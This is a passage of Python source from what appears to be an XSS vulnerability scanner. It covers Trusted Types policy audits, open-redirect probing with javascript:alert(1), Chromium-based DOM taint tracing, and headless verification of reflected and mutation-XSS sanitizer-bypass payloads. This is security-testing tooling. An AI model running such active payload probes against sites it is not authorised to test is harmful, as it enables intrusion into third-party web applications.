                                          if "/" in file_str else file_str)
                            insecure_summary = ", ".join(
                                m for m, _ in pf.insecure_methods[:3]
                            ) or "audit"
                            payload_label = (
                                f"TT policy '{pf.policy_name}' "
                                f"({insecure_summary}) @ {file_short}:{pf.line}"
                            )
                            _emit_hit(cb, {
                                "url":      page_url,
                                "param":    f"TT:{pf.policy_name}",
                                "context":  f"trusted-types-policy ({pf.severity})",
                                "csp_note": "",
                                "status":   "TT-POLICY",
                                "source":   "trusted-types",
                                "payload":  payload_label,
                                "trusted_types_finding": finding_dict,
                            })
                            if pf.is_default_policy and pf.insecure_methods:
                                cb["on_log"](
                                    f"[TT] 🚨 SILENT BACKDOOR: 'default' policy "
                                    f"@ {file_short}:{pf.line} — "
                                    f"{pf.insecure_methods[0][1]}",
                                    "info"
                                )

                except Exception as e:
                    cb["on_log"](
                        f"[TT] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}", "warn"
                    )

            sev_counts = {}
            for f in trusted_types_findings:
                sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1
            cb["on_log"](
                f"[TT] done: {len(trusted_types_findings)} findings "
                f"({dict(sev_counts) if sev_counts else 'none'}), "
                f"{policies_audited} policies audited, "
                f"{csp_with_tt}/{len(tt_pages_to_check)} pages have TT in the CSP",
                "info"
            )

        except Exception as e:
            cb["on_log"](f"[!] Trusted Types phase crashed: {e}", "warn")

    elif not _TRUSTED_TYPES_AVAILABLE and trusted_types:
        cb["on_log"](
            "Trusted Types analyzer: modul _trusted_types_analyzer.py "
            "not available — skipped", "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # OPEN REDIRECT → XSS CHAIN PHASE (v10.11)
    # ════════════════════════════════════════════════════════════════════════
    # Two strategies running in parallel:
    #
    #   A. Network-based: discover URLs with redirect-style parameters
    #      (?url=, ?redirect=, ?next=, ?dest=, ...) — there are ~40 known names.
    #      For each candidate, send javascript:alert(1) and check:
    #        - HTTP 30x with Location: javascript: → CRITICAL (server reflects)
    #        - HTML <meta refresh> / <a href> with javascript: → HIGH
    #        - JS code: location = "javascript:" → HIGH
    #      Also detect non-XSS open redirects (severity medium).
    #
    #   B. Static AST: parse JS bundles for redirect sinks (location.href = X,
    #      location.replace(X), history.pushState) where X traces to user input.
    #      Uses 2-step variable tracking (params.get → next → location.href).
    # ════════════════════════════════════════════════════════════════════════
    open_redirect_findings: List[Dict] = []
    if (_OPEN_REDIRECT_AVAILABLE and open_redirect
            and not _cancelled.is_set()
            and _phase_target_alive("OPEN-REDIRECT")):
        try:
            cb["on_log"]("Open Redirect → XSS chain audit (javascript: schema)...", "info")
            cb["on_phase"]("open_redirect", {})

            # ── Strategy A — Network test on URL candidates ──
            # Collect all crawled URLs that have parameters (param_urls)
            # PLUS the target URL.
            all_urls_to_check = list(param_urls or []) + [target]
            # v10.41: param_urls může v některých cestách (wordlist/SPA/checkpoint)
            # nést tuple (url, meta) → coerce na string. Jinak tuple doteče do
            # build_redirect_test_url → session.get(tuple) → 'tuple' has no
            # attribute 'strip' a shodí celou open-redirect fázi (a tím i detekci
            # javascript:-URI XSS typu level 5).
            all_urls_to_check = [
                (u[0] if isinstance(u, (tuple, list)) and u else u)
                for u in all_urls_to_check
            ]
            all_urls_to_check = [u for u in all_urls_to_check if isinstance(u, str) and u]
            candidates = _or_discover(all_urls_to_check)

            cb["on_log"](
                f"[OPEN-REDIRECT] {len(candidates)} candidate (url, param) "
                f"pairs found in crawled URLs", "info"
            )

            # Aggregation: same (param, redirect_kind, severity) on multiple
            # pages = 1 finding with affects_pages list
            or_aggregation: Dict[Tuple, Dict] = {}

            MAX_OR_TESTS = 30  # cap to limit scan time
            tested_count = 0
            xss_chain_count = 0
            open_redirect_count = 0

            for cand_url, param_name in candidates[:MAX_OR_TESTS]:
                if _cancelled.is_set():
                    break
                # v10.41: pojistka — cand_url musí být string (viz coerce výše)
                if isinstance(cand_url, (tuple, list)):
                    cand_url = cand_url[0] if cand_url else ""
                if not isinstance(cand_url, str) or not cand_url:
                    continue
                tested_count += 1

                # Build a session-using fetcher closure for the module
                def _fetcher(test_url, allow_redirects=False, timeout=timeout):
                    try:
                        # v10.20 fix: bylo `session` (nedefinováno v run_scan →
                        # NameError tiše spolknut try/except → každý fetch None
                        # → celá open-redirect fáze bez nálezů). Správně je
                        # session_main.
                        return session_main.get(
                            test_url,
                            timeout=timeout,
                            allow_redirects=allow_redirects,
                        )
                    except Exception:
                        return None

                finding = _or_test_endpoint(
                    _fetcher, cand_url, param_name,
                    timeout=timeout, follow_redirects=False,
                )
                if not finding:
                    continue

                if finding.is_xss_chain:
                    xss_chain_count += 1
                else:
                    open_redirect_count += 1

                finding_dict = {
                    "url":            finding.url,
                    "param":          finding.param,
                    "method":         finding.method,
                    "redirect_kind":  finding.redirect_kind,
                    "is_xss_chain":   finding.is_xss_chain,
                    "payload":        finding.payload,
                    "response_status": finding.response_status,
                    "location_header": finding.location_header,
                    "snippet":        finding.snippet,
                    "severity":       finding.severity,
                    "confidence":     finding.confidence,
                    "note":           finding.note,
                    "source":         "open-redirect",
                }
                open_redirect_findings.append(finding_dict)

                # Aggregate by (param, kind, severity)
                agg_key = (
                    finding.param,
                    finding.redirect_kind,
                    finding.severity,
                )
                if agg_key not in or_aggregation:
                    or_aggregation[agg_key] = {
                        "finding": finding_dict,
                        "affects_pages": [],
                    }
                if cand_url not in or_aggregation[agg_key]["affects_pages"]:
                    or_aggregation[agg_key]["affects_pages"].append(cand_url)

            # ── Strategy B — Static AST detection on JS sources ──
            # Pull JS bundles from already-fetched pages (no extra HTTP cost).
            # We deduplicate by URL to avoid analyzing same bundle twice.
            static_sinks: List = []
            static_files_seen: set = set()

            # Iterate over pages list (already crawled, HTML in cache)
            # For each page, extract inline scripts AND external .js URLs
            try:
                from _static_js_analyzer import extract_inline_scripts
                MAX_OR_STATIC_PAGES = 25
                for page_url in (pages or [target])[:MAX_OR_STATIC_PAGES]:
                    if _cancelled.is_set():
                        break
                    # v10.39: pages může v některých cestách nést tuple
                    # (url, meta) → coerce na string, jinak session.get(tuple)
                    # spadne na chybu tuple/strip a shodí celou fázi.
                    if isinstance(page_url, (tuple, list)):
                        page_url = page_url[0] if page_url else ""
                    if not isinstance(page_url, str) or not page_url:
                        continue
                    if page_url in static_files_seen:
                        continue
                    static_files_seen.add(page_url)
                    # Fetch page HTML
                    try:
                        page_resp = session_main.get(page_url, timeout=timeout)
                        page_html = page_resp.text if page_resp else ""
                    except Exception as _pe:
                        _swallow(_pe, f"static-JS page fetch {page_url}")
                        continue
                    # Inline scripts
                    inline_scripts = extract_inline_scripts(page_html)
                    for idx, _script_item in enumerate(inline_scripts or []):
                        # v10.42: extract_inline_scripts vrací (script_body, line)
                        # tuply — rozbal, jinak tuple doteče do _or_static_sinks →
                        # source_code.strip() → 'tuple' has no attribute 'strip'.
                        # TOHLE byla skutečná příčina open-redirect crashe.
                        script_code = (_script_item[0]
                                       if isinstance(_script_item, (tuple, list))
                                       else _script_item)
                        if not isinstance(script_code, str) or not script_code:
                            continue
                        sinks = _or_static_sinks(
                            script_code, f"{page_url}#inline_{idx}"
                        )
                        static_sinks.extend(sinks)
                    # External .js — extract URL refs, fetch top 5 per page
                    js_url_pattern = re.compile(
                        r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                        re.IGNORECASE
                    )
                    ext_js_urls = js_url_pattern.findall(page_html)[:5]
                    for js_url in ext_js_urls:
                        # Resolve relative
                        abs_url = urljoin(page_url, js_url)
                        if abs_url in static_files_seen:
                            continue
                        static_files_seen.add(abs_url)
                        try:
                            js_resp = session_main.get(abs_url, timeout=timeout)
                            js_src = js_resp.text if js_resp else ""
                            if js_src:
                                sinks = _or_static_sinks(js_src, abs_url)
                                static_sinks.extend(sinks)
                        except Exception:
                            continue
            except ImportError:
                cb["on_log"](
                    "[OPEN-REDIRECT] _static_js_analyzer not available, "
                    "skipping static AST detection", "warn"
                )

            # ── After-loop emit (Strategy A — aggregated) ──
            for agg_key, agg in or_aggregation.items():
                finding_dict = dict(agg["finding"])
                affects = agg["affects_pages"]
                finding_dict["affects_pages"] = affects
                finding_dict["affects_count"] = len(affects)
                first_url = affects[0] if affects else finding_dict.get("url", "")
                param = finding_dict.get("param", "?")
                kind = finding_dict.get("redirect_kind", "?")
                sev = finding_dict.get("severity", "medium")
                is_xss = finding_dict.get("is_xss_chain", False)
                affects_label = (
                    f" [affects {len(affects)} pages]"
                    if len(affects) > 1 else ""
                )
                xss_label = " → XSS" if is_xss else ""
                payload_label = (
                    f"Open Redirect{xss_label}: {param}= → {kind}"
                    f"{affects_label}"
                )
                _emit_hit(cb, {
                    "url":      first_url,
                    "param":    f"OR:{param}",
                    "context":  f"open-redirect-{kind} ({sev})",
                    "csp_note": "",
                    "status":   "OR-XSS" if is_xss else "OR",
                    "source":   "open-redirect",
                    "payload":  payload_label,
                    "open_redirect_finding": finding_dict,
                })

            # ── Emit Strategy B findings (static AST) ──
            for sink in static_sinks:
                static_finding_dict = {
                    "file":           sink.file,
                    "line":           sink.line,
                    "sink_name":      sink.sink_name,
                    "source_pattern": sink.source_pattern,
                    "snippet":        sink.snippet,
                    "severity":       sink.severity,
                    "confidence":     sink.confidence,
                    "is_static":      True,
                    "source":         "open-redirect-static",
                }
                open_redirect_findings.append(static_finding_dict)
                file_short = (sink.file.rsplit("/", 1)[-1]
                               if "/" in sink.file else sink.file)
                payload_label = (
                    f"OR sink (static): {sink.sink_name} ← "
                    f"{sink.source_pattern} @ {file_short}:{sink.line}"
                )
                _emit_hit(cb, {
                    "url":      sink.file,
                    "param":    f"OR:{sink.sink_name[:20]}",
                    "context":  f"open-redirect-static ({sink.severity})",
                    "csp_note": "",
                    "status":   "OR-STATIC",
                    "source":   "open-redirect",
                    "payload":  payload_label,
                    "open_redirect_finding": static_finding_dict,
                })

            cb["on_log"](
                f"[OPEN-REDIRECT] done: {len(open_redirect_findings)} findings "
                f"({xss_chain_count} XSS chains, "
                f"{open_redirect_count} open-redirect-only, "
                f"{len(static_sinks)} static sinks), "
                f"tested {tested_count} endpoints "
                f"→ aggregated to {len(or_aggregation)} unique network finding(s)",
                "info"
            )

        except Exception as e:
            cb["on_log"](f"[!] Open Redirect phase crashed: {e}", "warn")

    elif not _OPEN_REDIRECT_AVAILABLE and open_redirect:
        cb["on_log"](
            "Open Redirect modul: _open_redirect.py "
            "not available — skipped", "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # DOM v6 TAINT-AWARE PHASE
    # ════════════════════════════════════════════════════════════════════════
    # Pro každou unikátní crawlovanou stránku:
    #   1. Vezmi její query parametry
    #   2. Pošli URL s unikátním canary v každém parametru + fragmentu
    #   3. Otevři v Chromium s injected hooks
    #   4. Sleduj source reads (location.*, document.*, postMessage)
    #   5. Sleduj sink hits (innerHTML, eval, document.write, ...)
    #   6. Pokud canary tečel ze source do sink → CONFIRMED DOM XSS chain
    #
    # Tohle najde:
    #   - Twitter-style #! XSS (location.hash → eval/innerHTML)
    #   - sudo.co.il level19 patterns (signed param decoded by JS)
    #   - DOM XSS které čistě HTTP scanner přehlédne (server-response je čistý)
    #   - postMessage XSS (event.data → innerHTML)
    #
    # Cost: ~1-2s per scanovaná page (cap MAX_DOM_V6_PAGES).
    # ════════════════════════════════════════════════════════════════════════
    dom_v6_findings: List[Dict] = []
    if (_DOM_V6_AVAILABLE and dom_v6_taint and not _cancelled.is_set()
            and _phase_target_alive("DOM-V6")):
        try:
            cb["on_log"]("DOM v6 taint analysis (Chromium + source/sink hooks)...", "info")
            cb["on_phase"]("dom_v6_taint", {})

            # Sestav unikátní URLs k otestování — target + první N stránek
            # z crawled `pages`. Pro SPA hash routes (#/search, #/track-result)
            # zachovej fragment v dedup klíči — _normalize_endpoint strips
            # fragments, což pro hash-mode SPAs sloučí všechny routes do 1.
            # v10.86: was a hardcoded 25. On any site bigger than that, most
            # pages silently got NO DOM analysis and nothing said so — the
            # Firing Range benchmark initially measured this cap and mistook it
            # for a detector failure (0/19 recall that is really 16/19). Raised,
            # made tunable, and — most importantly — the skip is now REPORTED.
            MAX_DOM_V6_PAGES = _dom_v6_page_cap()

            def _dom_v6_dedup_key(u: str) -> str:
                """SPA-aware endpoint key: keeps fragment so /#/search and
                /#/track-result are NOT treated as the same endpoint."""
                try:
                    p = urlparse(u or "")
                    scheme = (p.scheme or "http").lower()
                    netloc = (p.netloc or "").lower()
                    path = p.path or "/"
                    if len(path) > 1 and path.endswith("/"):
                        path = path[:-1]
                    # KEY DIFFERENCE: include fragment if present
                    # (for hash-route SPAs each fragment IS the route)
                    frag = p.fragment or ""
                    if frag:
                        # Strip query string from fragment for dedup
                        # (so /#/search?q=a and /#/search?q=b dedup)
                        frag_path = frag.split("?")[0]
                        return f"{scheme}://{netloc}{path}#{frag_path}"
                    return f"{scheme}://{netloc}{path}"
                except Exception:
                    return u or ""

            v6_pages_seen: set = set()
            v6_pages_to_check: List[str] = [target]
            v6_pages_seen.add(_dom_v6_dedup_key(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _dom_v6_dedup_key(u)
                if ne in v6_pages_seen:
                    continue
                v6_pages_seen.add(ne)
                v6_pages_to_check.append(u)
                if (MAX_DOM_V6_PAGES is not None
                        and len(v6_pages_to_check) >= MAX_DOM_V6_PAGES):
                    break

            cb["on_log"](
                f"[DOM-V6] {len(v6_pages_to_check)} unique pages for taint analysis",
                "info"
            )
            # v10.86: never let the cap silently truncate coverage. An unscanned
            # page is not a clean page, and the report must not imply otherwise.
            # v10.75: gate the warning on the cap ACTUALLY binding (not on dedup
            # shrinking the list), and stay silent about a "None" cap when the
            # cap is disabled.
            _v6_total_candidates = 1 + len(pages or [])
            _v6_cap_bound = (MAX_DOM_V6_PAGES is not None
                             and len(v6_pages_to_check) >= MAX_DOM_V6_PAGES)
            if _v6_cap_bound and _v6_total_candidates > len(v6_pages_to_check):
                _v6_skipped = _v6_total_candidates - len(v6_pages_to_check)
                cb["on_log"](
                    f"[DOM-V6] ⚠ page cap {MAX_DOM_V6_PAGES} reached — "
                    f"{_v6_skipped} discovered page(s) got NO DOM analysis and are "
                    f"NOT covered by this scan. Raise XSSG_DOM_V6_MAX_PAGES to go deeper.",
                    "warn"
                )
            elif MAX_DOM_V6_PAGES is None:
                cb["on_log"](
                    "[DOM-V6] page cap disabled (XSSG_DOM_V6_MAX_PAGES=unlimited) — "
                    f"analyzing every crawled page ({len(v6_pages_to_check)}).",
                    "info"
                )

            # SPAs need longer hydration time — Angular/React/Vue need to
            # bootstrap, mount components, run lifecycle hooks before sinks
            # like [innerHTML] bindings are exposed. Default 1500ms is fine
            # for static pages but Angular often needs 3-4s on first load.
            v6_grace_ms = 4000 if _spa_fallback_used else 1500
            v6_timeout = 12.0 if _spa_fallback_used else 8.0

            with _DV6(headless=True, timeout_s=v6_timeout,
                       grace_ms=v6_grace_ms, auto_interact=True) as v6:
                if not v6.available:
                    cb["on_log"]("[DOM-V6] Chromium failed to start — skipped", "warn")
                else:
                    for idx, page_url in enumerate(v6_pages_to_check):
                        if _cancelled.is_set():
                            break
                        cb["on_progress"](idx + 1, len(v6_pages_to_check))
                        try:
                            scan = v6.scan_url(page_url)
                            for f6 in scan.findings:
                                # Zaznamenej VŠECHNY nálezy (i bez confirmu) —
                                # source reads samy o sobě jsou užitečné
                                # (signál že parametr je čten v JS).
                                source_count = len(f6.source_reads)
                                sink_count = len(f6.sink_hits)
                                marker_in_sink = sum(
                                    1 for s in f6.sink_hits if s.marker_matches
                                )
                                chain_count = len(f6.taint_chains)
                                dialog_with_marker = sum(
                                    1 for d in f6.dialogs
                                    if d.get("marker_matches")
                                )

                                # Kategorizuj severity.
                                # v10.79 FP fix: a bare alphanumeric canary merely
                                # APPEARING in an HTML-parse sink (innerHTML/write/
                                # insertAdjacentHTML/srcdoc/DOMParser/…) is only a
                                # TAINT FLOW — HTML-escaping leaves the token
                                # byte-identical, so `el.innerHTML = escapeHTML(q)`
                                # (safe) previously reported as browser-CONFIRMED
                                # high XSS. Only a dialog/page-error with the marker
                                # OR the marker reaching a code-exec / scheme-gated
                                # sink (f6.exploit_confirmed) is proof of execution.
                                if f6.exploit_confirmed:
                                    severity = "high"
                                    label = ("CONFIRMED chain" if chain_count > 0
                                             else "CONFIRMED exec")
                                elif marker_in_sink > 0:
                                    severity = "medium"
                                    label = "taint flow to HTML sink (exploit unverified)"
                                elif source_count > 0 and sink_count > 0:
                                    severity = "medium"
                                    label = "source+sink (no chain)"
                                elif source_count > 0:
                                    severity = "low"
                                    label = "source read only"
                                else:
                                    continue   # nic zajímavého

                                finding = {
                                    "url":               f6.url,
                                    "target_param":      f6.target_param,
                                    "canary":            f6.canary,
                                    "confirmed":         f6.confirmed,
                                    "triggered_by":      f6.triggered_by,
                                    "severity":          severity,
                                    "label":             label,
                                    "source_count":      source_count,
                                    "sink_count":        sink_count,
                                    "marker_in_sink":    marker_in_sink,
                                    "chain_count":       chain_count,
                                    "dialogs_with_marker": dialog_with_marker,
                                    "interactions_done": f6.interactions_done,
                                    "elapsed_ms":        f6.elapsed_ms,
                                    # Detail pro JSON report (top 5 každé)
                                    "top_sources":       [
                                        {"source": s.source, "value": s.value[:120],
                                         "has_marker": s.has_marker}
                                        for s in f6.source_reads[:5]
                                    ],
                                    "top_sinks":         [
                                        {"sink": s.sink, "value": s.value[:120],
                                         "marker_matches": s.marker_matches}
                                        for s in f6.sink_hits[:5]
                                    ],
                                    "taint_chains":      [
                                        {"source": tc.source, "sink": tc.sink,
                                         "marker": tc.marker, "delta_ms": tc.delta_ms,
                                         "chain_value": tc.chain_value[:120]}
                                        for tc in f6.taint_chains[:5]
                                    ],
                                    "csp_violations":    f6.csp_violations[:3],
                                }
                                dom_v6_findings.append(finding)

                                # Emit přes _emit_hit pro CONFIRMED nálezy
                                # (nižší severity zůstanou jen v JSON sekci)
                                if severity == "high":
                                    payload_label = (
                                        f"DOM-V6 {label} | param={f6.target_param} "
                                        f"chains={chain_count} sinks_with_canary={marker_in_sink}"
                                    )
                                    _emit_hit(cb, {
                                        "url":      f6.url,
                                        "param":    f6.target_param,
                                        "context":  f"dom-v6-taint ({label})",
                                        "csp_note": "",
                                        "status":   "DOM",
                                        "source":   "dom-v6",
                                        "payload":  payload_label,
                                        "dom_verified": True,    # Chromium ověřilo
                                        "dom_v6_finding": finding,
                                    })
                                    if chain_count > 0:
                                        for tc in f6.taint_chains[:3]:
                                            cb["on_log"](
                                                f"[DOM-V6] 🚨 {f6.target_param} → "
                                                f"{tc.source} → {tc.sink} "
                                                f"(canary {tc.marker})",
                                                "info"
                                            )
                                    else:
                                        cb["on_log"](
                                            f"[DOM-V6] 🚨 {label} on {f6.target_param} "
                                            f"({page_url[:80]})",
                                            "info"
                                        )

                            # Runtime Trusted Types policy audit (v10.72) — the
                            # injected hook probed every registered policy; a
                            # pass-through transformer (esp. the 'default' policy)
                            # is a silent TT backdoor static analysis can't see.
                            #
                            # v10.75 FP fix: the probe proves the transformer is a
                            # NO-OP — not that XSS fires through it. So (a) gate on
                            # whether require-trusted-types-for 'script' is really
                            # enforced (an unenforced pass-through policy is inert
                            # and was a pure FP), and (b) do NOT set dom_verified:
                            # that flag means "Chromium executed our payload" and
                            # makes the scorer/store treat the finding as a proven
                            # unique-nonce XSS (+0.50 confidence, fp_risk cleared).
                            try:
                                _tt_all = []
                                for _f6 in scan.findings:
                                    _tt_all.extend(getattr(_f6, "tt_policies", []) or [])
                                if _tt_all:
                                    from _trusted_types_analyzer import (
                                        analyze_runtime_tt_policies as _tt_rt)
                                    _tt_enf = getattr(scan, "tt_enforced", None)
                                    for _ttf in _tt_rt(_tt_all, page_url,
                                                       enforced=_tt_enf):
                                        _emit_hit(cb, {
                                            "url":      _ttf["url"] or page_url,
                                            "param":    _ttf["param"],
                                            "context":  _ttf["context"],
                                            "csp_note": "",
                                            "status":   "TT-RUNTIME",
                                            "source":   _ttf["source"],
                                            "payload":  _ttf["payload"],
                                            "severity": _ttf["severity"],
                                            # v10.74: collapse the same policy across
                                            # all crawled pages to ONE finding.
                                            "dedup_url": _ttf.get("dedup_url"),
                                            # Honest confidence: no confirmed
                                            # source→sink flow through the policy.
                                            "verification_required": True,
                                            "fp_risk": True,
                                            "fp_reason": _ttf.get("fp_reason", ""),
                                            "tt_probe_confirmed": True,
                                            "tt_enforced": _tt_enf,
                                            "evidence": _ttf.get("evidence", ""),
                                            "description": _ttf.get("description", ""),
                                            "cwe_hint": _ttf.get("cwe_hint", ""),
                                            "tt_runtime_finding": _ttf,
                                        })
                                        cb["on_log"](
                                            f"[TT-RUNTIME] pass-through policy "
                                            f"'{_ttf['policy']}' {_ttf['transformer']} "
                                            f"({_ttf['severity']}, enforced={_tt_enf}) "
                                            f"on {page_url[:70]}",
                                            "warning")
                            except Exception as _tte:
                                logging.debug(f"[TT-RUNTIME] audit failed {page_url}: {_tte}")
                        except Exception as e:
                            cb["on_log"](
                                f"[DOM-V6] scan failed for {page_url[:80]}: "
                                f"{type(e).__name__}: {e}",
                                "warn"
                            )

            confirmed_count = sum(1 for f in dom_v6_findings if f["confirmed"])
            chain_count_total = sum(f["chain_count"] for f in dom_v6_findings)
            cb["on_log"](
                f"[DOM-V6] done: {len(dom_v6_findings)} findings "
                f"({confirmed_count} confirmed, {chain_count_total} taint chains)",
                "info"
            )

        except Exception as e:
            cb["on_log"](f"[!] DOM v6 phase crashed: {e}", "warn")

    elif not _DOM_V6_AVAILABLE and dom_v6_taint:
        cb["on_log"](
            "DOM v6: module _dom_v6.py / playwright not available — skipped",
            "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # HEADLESS DOM VERIFIER PHASE — definitivní verifikace v Chromium
    # ════════════════════════════════════════════════════════════════════════
    # Selektivně bere kandidáty na verifikaci:
    #   - results s gate_klass=xss_executable a vysokou důvěrou
    #   - template_injection_findings (drahá kategorie, cenné FP eliminovat)
    #   - mutation_xss_findings (manuální verifikaci konečně dotáhnout)
    #
    # NE-verifikuje:
    #   - DOM/postMessage/websocket dynamic findings (už dom_verified=True)
    #   - tag_injection / text_only findings (low value)
    #   - WAF blocks
    #
    # Verdict:
    #   "executed"     → Chromium fakt exekvoval JS s canary  → CONFIRMED
    #   "not_executed" → page se naloadovala, nic nevyhodilo  → likely FP
    #   "error"        → browser/network problém              → inconclusive
    #
    # Cost: ~600ms první request + 400ms následující. Pro 20 findings = ~10s.
    # ════════════════════════════════════════════════════════════════════════
    headless_verdicts: List[Dict] = []
    if (_HEADLESS_VERIFIER_AVAILABLE and headless_verify
            and not _cancelled.is_set()
            and _phase_target_alive("HEADLESS")):
        try:
            cb["on_log"]("Headless DOM verifier (Chromium) starting...", "info")
            cb["on_phase"]("headless_verify", {})

            # ── Sestavit kandidáty na verifikaci ─────────────────────────
            candidates_to_verify: List[Dict] = []
            seen_keys: set = set()

            # 1) Existing results s gate_klass=xss_executable
            for r in results:
                if (r.get("gate_klass") == "xss_executable"
                        or r.get("rich_severity") == "critical"):
                    key = (_normalize_endpoint(r.get("url", "")),
                           r.get("param", ""))
                    if key in seen_keys:
                        continue
                    seen_keys.add(key)
                    candidates_to_verify.append({
                        "kind":    "reflected",
                        "url":     r.get("url", ""),
                        "param":   r.get("param", ""),
                        "payload": r.get("payload", ""),
                        # v10.79 FN fix: the reflected class is dominated by ASYNC
                        # event-handler payloads (<img src=x onerror=…>, <svg/body
                        # onload=…>) whose error/load event fires AFTER
                        # domcontentloaded. framework_wait=False read
                        # window.__XSGV_RESULT__ with zero settle → dialogs=[] →
                        # NOT_EXECUTED → the real XSS was demoted to low+fp_risk.
                        # adaptive_settle early-exits on a real canary dialog, so
                        # confirming true positives stays cheap.
                        "framework_wait": True,
                        "result_ref": r,
                    })

            # 2) Template injection findings
            for ti in template_injection_findings:
                key = (_normalize_endpoint(ti.get("url", "")),
                       ti.get("param", ""))
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                candidates_to_verify.append({
                    "kind":    "template_injection",
                    "url":     ti.get("url", ""),
                    "param":   ti.get("param", ""),
                    "payload": ti.get("probe_payload", ""),
                    "framework_wait": True,    # SPA potřebuje čas na bootstrap
                    "framework": ti.get("framework", ""),
                    "result_ref": ti,
                })

            # 3) Mutation XSS findings — verifikuje se přes verify_test_page
            #    s build_test_page() helper z _mutation_xss.py
            mxss_to_verify = []
            if _MUTATION_XSS_AVAILABLE:
                for mx in mutation_xss_findings:
                    san_str = mx.get("sanitizer", "")
                    # Use first 3 mXSS payloads from bank, targeted at this sanitizer
                    try:
                        san_enum = None
                        for s in _MXSanitizer:
                            if s.value == san_str:
                                san_enum = s
                                break
                        if san_enum is None:
                            san_enum = _MXSanitizer.DOMPURIFY
                        bank = _mx_payloads_for_san(san_enum) or _mx_payload_bank()
                        # v10.82 DEPTH: verify the WHOLE matched bank. The old
                        # bank[:3] were all SVG/MathML namespace payloads, so the
                        # noscript / template / declarative-shadow-DOM / rawtext-attr
                        # / CVE families were NEVER browser-checked. Keep breadth via
                        # a small per-target_class cap; the global MAX_VERIFY cap
                        # below still bounds total verifier cost.
                        _mx_per_class = {}
                        for p in bank:
                            _mx_c = getattr(p, "target_class", "")
                            if _mx_per_class.get(_mx_c, 0) >= 4:
                                continue
                            _mx_per_class[_mx_c] = _mx_per_class.get(_mx_c, 0) + 1
                            mxss_to_verify.append({
                                "kind":     "mutation_xss",
                                "url":      mx.get("url", ""),
                                "payload":  p.payload,
                                "sanitizer": san_str,
                                "payload_name": p.name,
                                # v10.82: parser-context payloads (declarative shadow
                                # DOM) are inert under innerHTML → verify via their
                                # required sink (setHTMLUnsafe), else they never fire.
                                "required_sink": getattr(p, "required_sink", "innerHTML"),
                                # pin the harness to the detected sanitizer version
                                "sanitizer_version": mx.get("sanitizer_version", ""),
                                "result_ref": mx,
                            })
                    except Exception:
                        continue

            cb["on_log"](
                f"[HEADLESS] candidates: reflected={sum(1 for c in candidates_to_verify if c['kind']=='reflected')}, "
                f"template={sum(1 for c in candidates_to_verify if c['kind']=='template_injection')}, "
                f"mxss-bypass-tests={len(mxss_to_verify)}",
                "info"
            )

            if (candidates_to_verify or mxss_to_verify):
                # Cap to prevent runaway cost
                MAX_VERIFY = 30
                if len(candidates_to_verify) > MAX_VERIFY:
                    cb["on_log"](
                        f"[HEADLESS] limited to the top {MAX_VERIFY} candidates "
                        f"(z {len(candidates_to_verify)})", "info"
                    )
                    candidates_to_verify = candidates_to_verify[:MAX_VERIFY]
                if len(mxss_to_verify) > MAX_VERIFY:
                    mxss_to_verify = mxss_to_verify[:MAX_VERIFY]

                # v10.15: PARALELIZACE — dříve sekvenční smyčka přes až 60
                # navigací (30 candidates + 30 mXSS), každá s 10s timeoutem
                # → nejhorší případ ~10 minut. Playwright sync API je
                # thread-bound (browser z jednoho threadu nelze použít z
                # jiného — ověřeno), proto KAŽDÝ worker thread drží VLASTNÍ
                # HeadlessVerifier (vlastní browser) přes thread-local. Tím
                # je max_browsers konečně funkční. Verdikty se sbírají a
                # veškerá mutace sdíleného stavu (headless_verdicts, ref
                # anotace, log, progress) probíhá single-threaded tady.
                import threading as _threading
                from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac

                _hv_workers = max(1, min(_HEADLESS_VERIFY_WORKERS,
                                         len(candidates_to_verify) + len(mxss_to_verify)))
                _hv_tls = _threading.local()
                _hv_instances = []
                _hv_instances_lock = _threading.Lock()

                def _hv_get():
                    """Vrátí (a lazily vytvoří) verifier pro tento thread."""
                    hv = getattr(_hv_tls, "hv", None)
                    if hv is None:
                        hv = _HV(headless=True, timeout_s=10.0,
                                 framework_wait_ms=800, screenshot=True)
                        hv.__enter__()
                        _hv_tls.hv = hv
                        with _hv_instances_lock:
                            _hv_instances.append(hv)
                    return hv

                def _verify_reflected(cand):
                    """Worker: jedna reflected/template verifikace. Vrací
                    (cand, verdict) nebo (cand, None) + případně exception."""
                    if _cancelled.is_set():
                        return (cand, None, None)
                    try:
                        hv = _hv_get()
                        if not hv.available:
                            return (cand, None, "chromium_unavailable")
                        canary = _hv_make_canary()
                        rewritten_payload = _hv_rewrite_payload(cand["payload"], canary)
                        test_url = inject_into_params(
                            cand["url"], cand["param"], rewritten_payload,
                            extra_params=None)
                        if not test_url:
                            return (cand, None, None)
                        verdict = hv.verify_url(
                            test_url, canary,
                            framework_wait=cand["framework_wait"])
                        return (cand, verdict, None, test_url, canary)
                    except Exception as ve:
                        return (cand, None, f"{type(ve).__name__}: {ve}")

                def _verify_mxss(cand):
                    """Worker: jedna mXSS verifikace přes build_test_page."""
                    if _cancelled.is_set():
                        return (cand, None, None)
                    try:
                        from _mutation_xss import build_test_page as _mx_build_test_page
                        hv = _hv_get()
                        if not hv.available:
                            return (cand, None, "chromium_unavailable")
                        canary = _hv_make_canary()
                        rewritten = _hv_rewrite_payload(cand["payload"], canary)
                        san_enum = _MXSanitizer.DOMPURIFY
                        for s in _MXSanitizer:
                            if s.value == cand.get("sanitizer", ""):
                                san_enum = s
                                break
                        test_html = _mx_build_test_page(
                            rewritten, sanitizer=san_enum,
                            insert=cand.get("required_sink", "innerHTML"),
                            version=cand.get("sanitizer_version", ""))
                        verdict = hv.verify_test_page(test_html, canary)
                        return (cand, verdict, None, canary)
                    except Exception as ve:
                        return (cand, None, f"{type(ve).__name__}: {ve}")

                _total_verify = len(candidates_to_verify) + len(mxss_to_verify)
                _done_count = 0
                try:
                    with _TPE(max_workers=_hv_workers) as _hv_exe:
                        # ── Reflected + template candidates (paralelně) ──
                        _futs = {_hv_exe.submit(_verify_reflected, c): c
                                 for c in candidates_to_verify}
                        for _fut in _ac(_futs):
                            if _cancelled.is_set():
                                break
                            _done_count += 1
                            cb["on_progress"](_done_count, _total_verify)
